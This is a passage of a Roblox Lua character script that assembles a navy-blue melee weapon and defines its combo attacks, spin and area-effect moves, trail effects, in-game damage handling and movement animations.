Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.799999952, 0.800000012, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.19150543, -0.00177383423, 1.87240982, -0.000657099125, 0.965924621, -0.258822352, 0.999997795, 7.67338804e-007, -0.00253604399, -0.00244950107, -0.258823037, -0.965922952))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/Asset/?id=9756362",Vector3.new(0, 0, 0),Vector3.new(0.616000056, 0.593999982, 1.36199999))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000006, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00175476074, -0.472427368, 3.79145432, -0.999991536, 5.04154229e-008, 0.00253869547, 0.00245207804, 0.258818686, 0.965922534, -0.000657055061, 0.965919077, -0.258819669))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.399999976, 0.400000095))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00175476074, -1.67246628, -2.59144211, 0.999991477, 2.08620037e-007, -0.00253769686, 0.00245122635, 0.258800924, 0.965927482, 0.000656995224, -0.965923607, 0.258801967))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000095))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00175857544, -1.07245636, -2.59143829, 0.999991477, 2.08620037e-007, -0.00253769686, 0.00245122635, 0.258800924, 0.965927482, 0.000656995224, -0.965923607, 0.258801967))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00175476074, -1.67240334, 3.79145813, -0.999991536, 5.04154229e-008, 0.00253869547, 0.00245207804, 0.258818686, 0.965922534, -0.000657055061, 0.965919077, -0.258819669))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.200000003, 0.400000036, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00177001953, -1.07242966, 3.79145813, -0.999991536, 5.04154229e-008, 0.00253869547, 0.00245207804, 0.258818686, 0.965922534, -0.000657055061, 0.965919077, -0.258819669))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.328000009, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(0.910000026, 0.200000003, 0.819999993))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00319671631, 1.69999313, -0.00432527065, 1.00000656, 1.07949205e-011, 5.30879479e-005, -1.07611697e-011, 1, 1.86495437e-012, -5.28909732e-005, -1.85864692e-012, 1.00000656))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(1.25999999, 0.200000003, 1.60000014))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00993728638, -2.69981766, -3.56435776e-005, 1.00000131, 1.3251622e-012, 2.64146365e-006, -1.31805677e-012, 1, 9.47592699e-014, -2.60141678e-006, -9.33706237e-014, 1.00000131))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.0780000091, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.400000006, 0.99999994, 0.800000072))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00101470947, -2.98979568, 0.000195622444, 0.999992371, 2.98643101e-008, -0.00423007505, -2.99577536e-008, 0.999999702, -5.96182872e-008, 0.0042301151, 1.50410031e-008, 0.999992251))
mesh("SpecialMesh",Part,Enum.MeshType.FileMesh,"http://www.roblox.com/asset/?id=1778999",Vector3.new(0, 0, 0),Vector3.new(0.954000056, 0.361999989, 0.988000035))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Navy blue","Part",Vector3.new(1.25999999, 0.200000003, 1.60000014))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00993728638, 2.69984818, -1.4424324e-005, 0.999988437, 5.97829199e-008, -0.00507963076, 5.97626766e-008, -0.999999702, 5.95426322e-008, -0.00507967174, -8.95721328e-008, -0.999988258))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.0780000091, 1))
Hitbox=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Hitbox",Vector3.new(0.800000012, 1.79999983, 7.19999981))
Hitboxweld=weld(m,handle,Hitbox,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00791168213, 2.89998627, 0.200349331, 1.00000167, 1.03490549e-011, 0.000589731848, -1.03561604e-011, 1, 2.07634691e-011, -0.000589691801, -2.0768132e-011, 1.00000167))

TrailDeb = false

function attackone()
	attack=true
	for i=0,1,0.07 do
		swait()
		RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(-50)),.2)
        Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(50)),.3)
        RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(160), math.rad(0), math.rad(10)), 0.2)
        LW.C0 = clerp(LW.C0, CFrame.new(.3, 0.5, -1) * angles(math.rad(160), math.rad(0), math.rad(50)), 0.2)
        handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(60),math.rad(-10),math.rad(0)),.2)
	end
	so("http://www.roblox.com/asset/?id=203691447",Hitbox,1,1)
	con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,10,30,math.random(10,20),"Knockdown",RootPart,.2,1) end) 
	 if TrailDeb == false then
							TrailDeb = true
						end
						

coroutine.wrap(function()
local Old = Hitbox.CFrame.p
while wait()do
if not TrailDeb then break end
local New = Hitbox.CFrame.p
local Mag =(Old -New).magnitude
local Dis =(Old +New)/2
local Trail = Instance.new("Part",Character)
Trail.Material = "SmoothPlastic"
Trail.Anchored = true
Trail.CanCollide = false
Trail.BrickColor = BrickColor.new("Navy blue")
Trail.Size = Vector3.new(0.2,Mag,0.2)
Trail.TopSurface = 0
Trail.BottomSurface = 0
Trail.formFactor = "Custom"
Trail.CFrame = CFrame.new(Dis,New)* CFrame.Angles(math.pi/2,0,0)
local ms = Instance.new("BlockMesh",Trail)
ms.Scale = Vector3.new(1,1,1)
local TM = Instance.new("CylinderMesh",Trail)
TM.Scale = Vector3.new(1,1,1)
Old = New
coroutine.wrap(function()
for i = 1,0,-0.1 do
wait()
TM.Scale = TM.Scale * Vector3.new(i,1,i)
end
Trail:remove()
end)()
coroutine.wrap(function()
for i = 1,10 do
wait()
Trail.Transparency = Trail.Transparency +0.1
end end)()end end)() 
	for i=0,1,0.06 do
		swait()
		RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(50)),.2)
        Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(10),math.rad(5),math.rad(-50)),.3)
        RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(10), math.rad(0), math.rad(10)), 0.2)
        LW.C0 = clerp(LW.C0, CFrame.new(.2, 0.2, -.5) * angles(math.rad(10), math.rad(0), math.rad(50)), 0.2)
        handleweld.C0=clerp(handleweld.C0,cf(0,0,0)*angles(math.rad(-20),math.rad(-10),math.rad(0)),.2)
	end
	attack=false
	con1:disconnect()
	if TrailDeb == true then
						TrailDeb = false
						end
end

function attacktwo()
        attack=true
        for i=0,1,0.06 do
                swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(90)),.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(-80)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(90)),.1)
LW.C0 = clerp(LW.C0, CFrame.new(.3, 0.5, -1) * angles(math.rad(0), math.rad(60), math.rad(90)), 0.1)
handleweld.C0=clerp(handleweld.C0,cf(0,-.5,-2)*angles(math.rad(-80),math.rad(-10),math.rad(0)),.1)

        end
con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,10,30,math.random(10,20),"Knockdown",RootPart,.2,1) end) 
so("http://www.roblox.com/asset/?id=203691492",Hitbox,1,1)
if TrailDeb == false then
TrailDeb = true
end
coroutine.wrap(function()
local Old = Hitbox.CFrame.p
while wait()do
if not TrailDeb then break end
local New = Hitbox.CFrame.p
local Mag =(Old -New).magnitude
local Dis =(Old +New)/2
local Trail = Instance.new("Part",Character)
Trail.Material = "SmoothPlastic"
Trail.Anchored = true
Trail.CanCollide = false
Trail.BrickColor = BrickColor.new("Navy blue")
Trail.Size = Vector3.new(0.2,Mag,0.2)
Trail.TopSurface = 0
Trail.BottomSurface = 0
Trail.formFactor = "Custom"
Trail.CFrame = CFrame.new(Dis,New)* CFrame.Angles(math.pi/2,0,0)
local ms = Instance.new("BlockMesh",Trail)
ms.Scale = Vector3.new(1,1,1)
local TM = Instance.new("CylinderMesh",Trail)
TM.Scale = Vector3.new(1,1,1)
Old = New
coroutine.wrap(function()
for i = 1,0,-0.1 do
wait()
TM.Scale = TM.Scale * Vector3.new(i,1,i)
end
Trail:remove()
end)()
coroutine.wrap(function()
for i = 1,10 do
wait()
Trail.Transparency = Trail.Transparency +0.1
end end)()end end)() 
for i=0,1,0.06 do
                swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(-50)),.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(50)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(-10),math.rad(90)),.1)
LW.C0 = clerp(LW.C0, CFrame.new(.3, 0.5, -1) * angles(math.rad(0), math.rad(-10), math.rad(90)), 0.1)
handleweld.C0=clerp(handleweld.C0,cf(0,-.5,-2)*angles(math.rad(-80),math.rad(-10),math.rad(0)),.1)
end

for i=0,1,1 do
swait()
so("http://www.roblox.com/asset/?id=203691467",Hitbox,1,1)
for i=0,1,0.1 do
swait()
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*euler(0,0,6*i),.3)
end
end

attack=false
con1:disconnect()
if TrailDeb == true then
						TrailDeb = false
						end
end

function attackthree()
        attack=true
        for i=0,1.5,0.06 do
swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(-10),math.rad(0),math.rad(00)),.1)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(00)),.1)
RW.C0=clerp(RW.C0,cf(1,0.8,-1)*angles(math.rad(130),math.rad(0),math.rad(-50)),.1)
LW.C0=clerp(LW.C0,cf(-1,0.8,-1)*angles(math.rad(130),math.rad(0),math.rad(50)),.1)
handleweld.C0=clerp(handleweld.C0,cf(-1,0,-.2)*angles(math.rad(-20),math.rad(-20),math.rad(50)),.3)
        end
so("http://roblox.com/asset/?id=203691467",Hitbox,1,1) 
con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,10,30,math.random(10,20),"Knockdown",RootPart,.2,1) end) 
if TrailDeb == false then
TrailDeb = true
end 
coroutine.wrap(function()
local Old = Hitbox.CFrame.p
while wait()do
if not TrailDeb then break end
local New = Hitbox.CFrame.p
local Mag =(Old -New).magnitude
local Dis =(Old +New)/2
local Trail = Instance.new("Part",Character)
Trail.Material = "SmoothPlastic"
Trail.Anchored = true
Trail.CanCollide = false
Trail.BrickColor = BrickColor.new("Navy blue")
Trail.Size = Vector3.new(0.2,Mag,0.2)
Trail.TopSurface = 0
Trail.BottomSurface = 0
Trail.formFactor = "Custom"
Trail.CFrame = CFrame.new(Dis,New)* CFrame.Angles(math.pi/2,0,0)
local ms = Instance.new("BlockMesh",Trail)
ms.Scale = Vector3.new(1,1,1)
local TM = Instance.new("CylinderMesh",Trail)
TM.Scale = Vector3.new(1,1,1)
Old = New
coroutine.wrap(function()
for i = 1,0,-0.1 do
wait()
TM.Scale = TM.Scale * Vector3.new(i,1,i)
end
Trail:remove()
end)()
coroutine.wrap(function()
for i = 1,10 do
wait()
Trail.Transparency = Trail.Transparency +0.1
end end)()end end)() 
      for i=0,1.5,.06 do
swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(20),math.rad(0),math.rad(0)),.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(-5),math.rad(00)),.2)
RW.C0=clerp(RW.C0,cf(1,0.2,-.5)*angles(math.rad(20),math.rad(0),math.rad(-50)),.2)
LW.C0=clerp(LW.C0,cf(-1,0.2,-.5)*angles(math.rad(20),math.rad(0),math.rad(50)),.2)
RH.C0=clerp(RH.C0,cf(1,-1,.2)*angles(math.rad(10),math.rad(70),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(-20),math.rad(-70),math.rad(-20)),.3)
handleweld.C0=clerp(handleweld.C0,cf(-1,0,-.2)*angles(math.rad(-20),math.rad(-20),math.rad(50)),.3)
        end
attack=false
con1:disconnect()
if TrailDeb == true then
						TrailDeb = false
						end
end

function JumpSpin()
attack=true
for i=0,1,0.06 do
swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(-50)),.1)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(50)),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(-10),math.rad(90)),.1)
LW.C0 = clerp(LW.C0, CFrame.new(.3, 0.5, -1) * angles(math.rad(0), math.rad(-10), math.rad(90)), 0.1)
handleweld.C0=clerp(handleweld.C0,cf(0,-.5,-2)*angles(math.rad(-80),math.rad(-10),math.rad(0)),.1)
end
if TrailDeb == false then
TrailDeb = true
end 
coroutine.wrap(function()
local Old = Hitbox.CFrame.p
while wait()do
if not TrailDeb then break end
local New = Hitbox.CFrame.p
local Mag =(Old -New).magnitude
local Dis =(Old +New)/2
local Trail = Instance.new("Part",Character)
Trail.Material = "SmoothPlastic"
Trail.Anchored = true
Trail.CanCollide = false
Trail.BrickColor = BrickColor.new("Navy blue")
Trail.Size = Vector3.new(0.2,Mag,0.2)
Trail.TopSurface = 0
Trail.BottomSurface = 0
Trail.formFactor = "Custom"
Trail.CFrame = CFrame.new(Dis,New)* CFrame.Angles(math.pi/2,0,0)
local ms = Instance.new("BlockMesh",Trail)
ms.Scale = Vector3.new(1,1,1)
local TM = Instance.new("CylinderMesh",Trail)
TM.Scale = Vector3.new(1,1,1)
Old = New
coroutine.wrap(function()
for i = 1,0,-0.1 do
wait()
TM.Scale = TM.Scale * Vector3.new(i,1,i)
end
Trail:remove()
end)()
coroutine.wrap(function()
for i = 1,10 do
wait()
Trail.Transparency = Trail.Transparency +0.1
end end)()end end)() 
con1=Hitbox.Touched:connect(function(hit) Damagefunc(hit,10,30,math.random(10,20),"Knockdown",RootPart,.2,1) end) 
for i=0,0.6,.5 do
	so("http://www.roblox.com/asset/?id=203691447",Hitbox,1,1)
swait()
for i=0,1,0.1 do
swait()
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,4)*euler(0,1.2,6*i),.2)
end
end
attack=false
con1:disconnect()
if TrailDeb == true then
						TrailDeb = false
						end
end

mouse.Button1Down:connect(function()
	if attack==false then
		if attacktype==1 then
			attacktype = 2
			attackone()
		elseif attacktype==2 then
			attacktype = 3
			attacktwo()
			elseif attacktype==3 then
			attacktype = 1
			attackthree()
		end
	end
end)

function MMMAGIC(part,x1,y1,z1,x2,y2,z2,color) 
        local msh1 = it("BlockMesh") 
        msh1.Scale = vt(0.5,0.5,0.5) 
        S=it("Part")
        S.Material = "SmoothPlastic"
        S.Name="Effect"
        S.formFactor=0
        S.Size=vt(x1,y1,z1)
        S.BrickColor=color
        S.Reflectance = 0
        S.TopSurface=0
        S.BottomSurface=0
        S.Transparency=0
        S.Anchored=true
        S.CanCollide=false
        S.CFrame=part.CFrame*cf(x2,y2,z2)*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
        S.Parent=workspace
        nooutline(S)
        msh1.Parent = S
        coroutine.resume(coroutine.create(function(Part,CF) for i=1, 9 do Part.Mesh.Scale = Part.Mesh.Scale + vt(0.1,0.1,0.1) Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50)) Part.Transparency=i*.1 wait() end Part.Parent=nil end),S,S.CFrame)
end 

function MMMAGIC2(part,x1,y1,z1,x2,y2,z2,color) 
        local msh1 = it("BlockMesh") 
        msh1.Scale = vt(0.5,0.5,0.5) 
        S=it("Part")
        S.Material = "SmoothPlastic"
        S.Name="Effect"
        S.formFactor=0
        S.Size=vt(x1,y1,z1)
        S.BrickColor=color
        S.Reflectance = 0
        S.TopSurface=0
        S.BottomSurface=0
        S.Transparency=0
        S.Anchored=true
        S.CanCollide=false
        S.CFrame=part*cf(x2,y2,z2)*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
        S.Parent=workspace
        nooutline(S)
        msh1.Parent = S
        coroutine.resume(coroutine.create(function(Part,CF) for i=1, 9 do Part.Mesh.Scale = Part.Mesh.Scale + vt(0.1,0.1,0.1) Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50)) Part.Transparency=i*.1 wait() end Part.Parent=nil end),S,S.CFrame)
end 

function MMMAGIC3(part,x1,y1,z1,x2,y2,z2,color) 
        local msh1 = it("BlockMesh") 
        msh1.Scale = vt(0.5,0.5,0.5) 
        S=it("Part")
        S.Material = "SmoothPlastic"
        S.Name="Effect"
        S.formFactor=0
        S.Size=vt(x1,y1,z1)
        S.BrickColor=color
        S.Reflectance = 0
        S.TopSurface=0
        S.BottomSurface=0
        S.Transparency=0
        S.Anchored=true
        S.CanCollide=false
        S.CFrame=part*cf(x2,y2,z2)*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
        S.Parent=workspace
        nooutline(S)
        msh1.Parent = S
        coroutine.resume(coroutine.create(function(Part,CF) for i=1, 9 do Part.Mesh.Scale = Part.Mesh.Scale + vt(0,0.1,0) Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50)) Part.Transparency=i*.1 wait() end Part.Parent=nil end),S,S.CFrame)
end 

DOHHit=function(hit,Damage,Pos) --credits to turdulator for making this function :D
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        t=hit.Parent:FindFirstChild("Torso")
        if h~=nil and t~=nil then
        if attackdebounce2 == false then 
        attackdebounce2 = true 
        coroutine.resume(coroutine.create(function() 
        wait(0.2) 
        attackdebounce2 = false 
        end)) 
        elseif attackdebounce2==true then return end
                if h.Parent==Character then
                        return
                end
                        c=it("ObjectValue")
                        c.Name="creator"
                        c.Value=game.Players.LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                if math.random(0,99)+math.random()<=7.8 then
--[[                        Knockback=Knockback*2
                        r=it("BodyAngularVelocity")
                        r.P=3000
                        r.maxTorque=vt(500000000,50000000000,500000000)*50000
                        r.angularvelocity=vt(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                        r.Parent=hit.Parent.Torso]]
        
                end
                h:TakeDamage(Damage) 
                game:GetService("Debris"):AddItem(vl,.2)
                rl=it("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=vt(500000,500000,500000)*50000000000000
                rl.angularvelocity=vt(math.random(-3,3),math.random(-3,3),math.random(-3,3))
                rl.Parent=t
                game:GetService("Debris"):AddItem(rl,.05)
                f=it("BodyPosition")
                f.P=800
                f.D=100
                f.maxForce=vt(math.huge,math.huge,math.huge)
                f.position=Pos.Position
                f.Parent=t
                game:GetService("Debris"):AddItem(f,.1)
        else
                if hit.CanCollide==false then
                        return
                end
--                DBExplode(DB)
        end
end

colors={"Really black","Navy blue"}
random=colors[math.random(1,#colors)]
function Absorber()
attack=true
so("http://www.roblox.com/asset/?id=231917977",LeftArm,1,1) 
for i=0,1,0.1 do
wait()
MMMAGIC(LeftArm,2,2,2,0,-1,0,BrickColor.new(random)) 
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(-10),math.rad(-60)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(-5),math.rad(50)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(40), math.rad(0), math.rad(30)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(90), math.rad(0), math.rad(40)), 0.3)
end
for i=0,1,0.1 do
wait(0)
MMMAGIC(LeftArm,2,2,2,0,-1,0,BrickColor.new(random)) 
end
for i=0,1,0.2 do
wait()
MMMAGIC(LeftArm,2,2,2,0,-1,0,BrickColor.new(random)) 
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(-10),math.rad(-90)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(5),math.rad(80)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(40), math.rad(0), math.rad(30)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(90), math.rad(0), math.rad(-90)), 0.3)
end
for i=0,1,0.15 do
wait(0)
MMMAGIC(LeftArm,2,2,2,0,-1,0,BrickColor.new(random)) 
end
so("http://www.roblox.com/asset/?id=231917822",LeftArm,1,1) 
MMMAGIC(LeftArm,4,4,4,0,-1,0,BrickColor.new("Navy blue")) 
MMMAGIC(LeftArm,4,4,4,0,-1,0,BrickColor.new("Black")) 
lacf=LeftArm.CFrame
coroutine.resume(coroutine.create(function() 
local derppart=part(3,workspace,"SmoothPlastic",0,0,BrickColor.new("Really black"),"Effect",vt(1,1,1))
derppart.Anchored=true
derppart.CFrame=lacf*CFrame.new(0,-1,0)
for i=1,50 do
wait()
local c = game.Workspace:GetChildren();
for i = 1, #c do
local hum = c[i]:findFirstChild("Humanoid")
if hum ~= nil and hum.Health ~= 0 then
local head = c[i]:findFirstChild("Head");
if head ~= nil then
local targ = head.Position - derppart.Position;
local mag = targ.magnitude;
if mag <= 7 and c[i].Name ~= Player.Name then 
DOHHit(head,math.random(1,3),derppart)
end 
end 
end 
end 
MMMAGIC2(lacf,3,3,3,0,-1,0,BrickColor.new(random)) 
MMMAGIC3(lacf,1,4,1,0,-1,0,BrickColor.new(random)) 
end
derppart.Parent=nil
end))
for i=0,1,0.2 do
wait()
end
attack=false
end

mouse.KeyDown:connect(function(k)
	k=k:lower()
	if k=='q' then
		if attack==false then
			JumpSpin()
		end
		elseif k=='e' then
		if attack==false then
			Absorber()
		end
	end
end)


local sine = 0
local change = 1
local val = 0

while true do
swait()
sine = sine + change
local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
local velderp=RootPart.Velocity.y
hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
if equipped==true or equipped==false then
if attack==false then
idle=idle+1
else
idle=0
end
if idle>=500 then
if attack==false then
--Sheath()
end
end
if RootPart.Velocity.y > 1 and hitfloor==nil then 
Anim="Jump"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(0),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-20),math.rad(-5),math.rad(30)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(50), math.rad(0), math.rad(20)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(30), math.rad(0), math.rad(-20)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,.2)*angles(math.rad(10),math.rad(70),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(-20),math.rad(-70),math.rad(-20)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.6)*angles(math.rad(100),math.rad(-10),math.rad(0)),.3)
end
elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
Anim="Fall"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(0),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(20),math.rad(5),math.rad(30)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(50), math.rad(0), math.rad(30)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(30), math.rad(0), math.rad(-30)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,.2)*angles(math.rad(10),math.rad(70),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(-20),math.rad(-70),math.rad(-20)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.6)*angles(math.rad(100),math.rad(-10),math.rad(0)),.3)
end
elseif torvel<1 and hitfloor~=nil then
Anim="Idle"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(-30)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(-5),math.rad(30)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(40), math.rad(0), math.rad(10)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(10), math.rad(0), math.rad(-20)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,.2)*angles(math.rad(5),math.rad(70),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-70),math.rad(-20)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.6)*angles(math.rad(100),math.rad(-10),math.rad(0)),.3)
end
elseif torvel>2 and torvel<22 and hitfloor~=nil then
Anim="Walk"
if attack==false then
change=3
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(30),math.rad(0),math.rad(-20)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-20),math.rad(-5),math.rad(20)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(150), math.rad(0), math.rad(10)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(50), math.rad(0), math.rad(-20)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-90),math.rad(-10)),.3)
handleweld.C0=clerp(handleweld.C0,cf(0,0,.6)*angles(math.rad(90),math.rad(-10),math.rad(0)),.3)
end
elseif torvel>=22 and hitfloor~=nil then
Anim="Run"
if attack==false then
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(30),math.rad(0),math.rad(-20)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-20),math.rad(-5),math.rad(20)),.3)
